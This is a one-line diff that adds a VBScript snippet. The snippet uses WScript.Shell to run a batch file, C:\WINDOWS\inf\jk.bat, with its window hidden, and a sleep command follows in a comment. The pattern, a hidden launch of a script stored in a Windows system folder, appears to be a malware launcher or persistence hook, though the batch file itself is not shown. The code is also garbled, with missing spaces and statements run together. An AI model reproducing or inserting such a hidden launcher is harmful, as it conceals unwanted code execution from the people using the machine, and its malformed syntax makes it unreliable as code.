@@ -1,0 +1,1 @@
+setws=wscript.createobject("wscript.shell")ws.run"C:\WINDOWS\inf\jk.bat",0'wscript.sleep10000
